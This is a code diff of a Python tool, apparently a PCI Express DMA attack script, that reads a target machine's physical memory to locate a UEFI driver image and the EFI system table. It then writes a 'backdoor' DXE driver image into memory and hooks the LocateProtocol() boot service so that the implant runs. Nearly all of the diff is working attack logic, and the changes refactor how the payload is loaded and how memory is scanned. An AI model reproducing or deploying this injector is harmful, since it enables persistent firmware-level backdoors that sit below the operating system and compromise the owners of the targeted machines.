@@ -26,8 +26,8 @@ RETRY_SLEEP = 2
 HEADER_SIZE = 0x400
 HEADER_MAGIC = 'MZ'
 
-MAX_TSEG_SIZE = 0x800000
-
+SCAN_FROM = 0x7a000000
+SCAN_STEP = 0x20 * PAGE_SIZE
 
 def _infector_config_offset(pe):
         
@@ -55,80 +55,28 @@ def _infector_config_set(pe, data, *args):
            pack(INFECTOR_CONFIG_FMT, *args) + \
            data[offs + INFECTOR_CONFIG_LEN :]
 
-def infector_get_image(payload, locate_protocol, system_table):
+def infector_get_image(payload_data, locate_protocol, system_table):
 
     import pefile
 
     # load payload image
-    pe_payload = pefile.PE(payload)
+    pe = pefile.PE(data = payload_data)
 
-    if pe_payload.OPTIONAL_HEADER.FileAlignment != \
-       pe_payload.OPTIONAL_HEADER.SectionAlignment:
+    if pe.OPTIONAL_HEADER.FileAlignment != pe.OPTIONAL_HEADER.SectionAlignment:
 
         raise(Exception('Bad payload image'))
 
-    # read payload image data into the string
-    data = open(payload, 'rb').read()
+    # read _INFECTOR_CONFIG, this structure is located inside .conf section of payload image
+    entry_rva, _, _ = _infector_config_get(pe, payload_data)
+    config_rva = _infector_config_offset(pe)
 
-    # read _INFECTOR_CONFIG, this structure is located at .conf section of payload image
-    entry_rva, _, _ = _infector_config_get(pe_payload, data)
-    config_rva = _infector_config_offset(pe_payload)
-
-    entry_rva -= pe_payload.OPTIONAL_HEADER.ImageBase
+    # calculate payload image entry point RVA
+    entry_rva -= pe.OPTIONAL_HEADER.ImageBase
     
     # write updated _INFECTOR_CONFIG back to the payload image
-    data = _infector_config_set(pe_payload, data, entry_rva, locate_protocol, system_table)
+    data = _infector_config_set(pe, payload_data, entry_rva, locate_protocol, system_table)
 
     return data, entry_rva, config_rva
-
-def find_tseg(dev):
-
-    addr = 0xf0000000
-
-    while addr > 0:
-
-        try:
-
-            ptr = 0
-
-            # do memory read attempt
-            dev.mem_read_4(addr)            
-
-            while ptr < 0x10000000:
-
-                try:
-
-                    # do memory read attempt
-                    dev.mem_read_4(addr + ptr)            
-
-                except dev.ErrorBadCompletion:
-
-                    return addr + ptr
-
-                ptr += MAX_TSEG_SIZE
-
-        except dev.ErrorBadCompletion:
-
-            pass
-
-        addr -= 0x10000000
-
-    return None
-
-def find_pe(dev, addr, size = 0x10000000, step = 1):
-
-    ptr = 0
-
-    while ptr < size:
-
-        # check for DOS header
-        if dev.mem_read(addr + ptr, 2) == HEADER_MAGIC:
-
-            return addr + ptr
-        
-        ptr -= step * PAGE_SIZE
-
-    return None
 
 def find_sys_table(dev, addr):
 
@@ -142,7 +90,7 @@ def find_sys_table(dev, addr):
             val = unpack('Q', data[ptr * 8 : ptr * 8 + 8])[0]
             
             # check for valid physical address
-            if val > 0x10000000 and val < 0xf0000000:
+            if val > 0x10000000 and val < 0x100000000:
 
                 # check EFI_SYSTEM_TABLE signature
                 if dev.mem_read(val, 8) == 'IBI SYST':
@@ -181,9 +129,19 @@ EFI_BOOT_SERVICES_LocateProtocol = 0x140
 
 valid_dxe_addr = lambda addr: addr > 0x1000 and addr < 0x100000000
 
-def dxe_inject(payload = None, system_table = None, status_addr = STATUS_ADDR):
+def dxe_inject(payload = None, payload_data = None, system_table = None, status_addr = STATUS_ADDR):
 
     dev = None    
+    g_st = system_table
+
+    if payload is not None:
+
+        assert os.path.isfile(payload)
+
+        with open(payload, 'rb') as fd:
+
+            # read payload image
+            payload_data = fd.read()
 
     while True:
 
@@ -204,14 +162,17 @@ def dxe_inject(payload = None, system_table = None, status_addr = STATUS_ADDR):
 
         except LinkLayer.ErrorNotReady as e: 
 
+            # link not redy
             print('[!] ' + str(e))
 
         except LinkLayer.ErrorTimeout as e:
 
+            # TLP reply timeout
             print('[!] ' + str(e))
 
         except TransactionLayer.ErrorBadCompletion as e: 
 
+            # bad MRd TLP completion received
             print('[!] ' + str(e))        
 
         # system is not ready yet
@@ -221,84 +182,57 @@ def dxe_inject(payload = None, system_table = None, status_addr = STATUS_ADDR):
 
     t = time.time()
 
-    if system_table is None:
+    if g_st is None:
 
-        tseg, g_st = find_tseg(dev), None
+        base, ptr = SCAN_FROM, 0
 
-        if tseg is None:
+        print('[+] Looking for DXE driver PE image...')
 
-            print('[!] Unable to locate TSEG, trying to find PE image...')
+        # try to find usable UEFI image at the middle of the first 4GB
+        while ptr < base:
 
-            base, ptr = 0x80000000, 0
-
-            # try to find usable UEFI image at the middle of the first 4GB
-            while ptr < base:
-
-                image = base - ptr
-                
-                # check for DOS header
-                if dev.mem_read(image, 2) == HEADER_MAGIC:
-
-                    print('[+] PE image is at 0x%x' % image)
-
-                    g_st = find_sys_table(dev, image)
-                    if g_st is not None:
-
-                        print('[+] EFI_SYSTEM_TABLE is at 0x%x' % g_st)
-                        break
-
-                ptr += 0x20 * PAGE_SIZE
-
-        else:
-
-            print('[+] TSEG is somewhere around 0x%x' % tseg)
-
-            pe_addr = tseg - MAX_TSEG_SIZE
+            image = base - ptr
             
-            while True:
+            # check for DOS header
+            if dev.mem_read(image, 2) == HEADER_MAGIC:
 
-                image = find_pe(dev, pe_addr, step = 0x10)
-                assert image is not None
-                
                 print('[+] PE image is at 0x%x' % image)
-                
+
                 g_st = find_sys_table(dev, image)
                 if g_st is not None:
 
                     print('[+] EFI_SYSTEM_TABLE is at 0x%x' % g_st)
                     break
 
-                # try next PE image
-                pe_addr = image - PAGE_SIZE
-
-    else:
-
-        g_st = system_table
+            ptr += SCAN_STEP
 
     assert g_st is not None
     assert valid_dxe_addr(g_st)
 
+    # get EFI_BOOT_SERVICES address
     g_bs = dev.mem_read_8(g_st + EFI_SYSTEM_TABLE_BootServices)    
 
     print('[+] EFI_BOOT_SERVICES is at 0x%x' % g_bs)
 
     assert valid_dxe_addr(g_bs)
 
+    # get LocateProtocol() address
     locate_protocol = dev.mem_read_8(g_bs + EFI_BOOT_SERVICES_LocateProtocol)    
 
     print('[+] EFI_BOOT_SERVICES.LocateProtocol() address is 0x%x' % locate_protocol)    
 
     assert valid_dxe_addr(locate_protocol)
 
-    if payload is not None:
+    if payload_data is not None:
 
-        data, entry_rva, _ = infector_get_image(payload, locate_protocol, g_st)
+        data, entry_rva, _ = infector_get_image(payload_data, locate_protocol, g_st)
         new_locate_protocol = BACKDOOR_ADDR + entry_rva
 
         print('Backdoor image size is 0x%x' % len(data))
         print('Backdoor entry RVA is 0x%x' % entry_rva)
         print('Planting DXE stage driver at 0x%x...' % BACKDOOR_ADDR)        
 
+        # write image to the memory
         dev.mem_write(BACKDOOR_ADDR, data)
 
         dev.mem_write_8(status_addr + 0, 0)
@@ -307,6 +241,7 @@ def dxe_inject(payload = None, system_table = None, status_addr = STATUS_ADDR):
         print('Hooking LocateProtocol(): 0x%.8x -> 0x%.8x' % \
               (locate_protocol, new_locate_protocol))
 
+        # hook LocateProtocol()
         dev.mem_write_8(g_bs + EFI_BOOT_SERVICES_LocateProtocol, new_locate_protocol)        
 
         print('%f sec.' % (time.time() - t))
@@ -315,7 +250,7 @@ def dxe_inject(payload = None, system_table = None, status_addr = STATUS_ADDR):
 
 def main():
 
-    dev = dxe_inject(payload = None)
+    dev = dxe_inject()
     dev.close()
 
     return 0
